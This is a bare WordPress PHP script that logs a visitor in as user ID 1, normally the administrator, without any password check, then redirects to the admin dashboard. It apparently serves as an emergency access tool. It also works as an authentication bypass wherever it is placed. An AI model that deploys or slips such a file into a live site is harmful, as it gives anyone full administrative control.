<?php
// Include WordPress functions
require_once('wp-load.php');
  
// Set the user ID to login
$user_id = 1;
  
// Get user data
$user = get_user_by('id', $user_id);
  
// Login the user
wp_set_auth_cookie($user_id);
wp_set_current_user($user_id);
  
// Redirect to the admin dashboard
wp_redirect(admin_url());
exit;
?>
